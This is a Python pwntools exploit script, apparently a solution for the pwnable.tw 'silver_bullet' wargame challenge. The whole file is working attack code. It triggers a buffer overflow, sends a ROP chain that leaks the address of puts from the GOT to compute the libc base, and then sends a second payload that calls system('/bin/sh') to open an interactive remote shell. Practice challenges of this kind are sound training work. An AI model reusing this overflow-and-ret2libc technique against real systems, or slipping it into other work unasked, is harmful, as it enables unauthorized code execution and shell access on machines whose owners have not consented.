```python
#!/usr/bin/env python2
#-*-coding:utf8-*-

from pwn import *

context.log_level = 'debug'
IP = 'chall.pwnable.tw'
PORT = '10103'
r = remote(IP, PORT)
#r = process('./silver_bullet')
e = ELF('./silver_bullet')
libc = ELF('libc_32.so.6')
#libc = e.libc

popret = 0x08048475
puts_plt = e.plt['puts']
puts_got = e.got['puts']
main = e.symbols['main']

r.recvuntil('Your choice :')
r.sendline('1')
r.recvuntil('Give me your description of bullet :')
r.sendline('A' * 47)
r.recvuntil('Your choice :')
r.sendline('2')
r.recvuntil('Give me your another description of bullet :')
r.sendline('0')
r.recvuntil('Your choice :')
r.sendline('2')

payload = 'A'*0x7
payload += p32(puts_plt)
payload += p32(popret)
payload += p32(puts_got)
payload += p32(main)

r.sendline(payload)
for i in range(2):
    r.sendline('3')
r.recvuntil('Oh ! You win !!\n')

puts_leak = u32(r.recv(4))
base = puts_leak - libc.symbols['puts']
system = base + libc.symbols['system']
binsh = base + libc.search('/bin/sh').next()

info('puts leak = ' + hex(puts_leak))
info('base addr = ' + hex(base))
info('system addr = ' + hex(system))
info('binsh addr = ' + hex(binsh))

r.recvuntil('Your choice :')
r.sendline('1')
r.recvuntil('Give me your description of bullet :')
r.sendline('A' * 47)
r.recvuntil('Your choice :')
r.sendline('2')
r.recvuntil('Give me your another description of bullet :')
r.sendline('0')
r.recvuntil('Your choice :')
r.sendline('2')

payload = 'A'*0x7
payload += p32(system)
payload += 'aaaa'
payload += p32(binsh)
r.sendline(payload)
for i in range(5):
    r.sendline('3')
r.interactive()
```
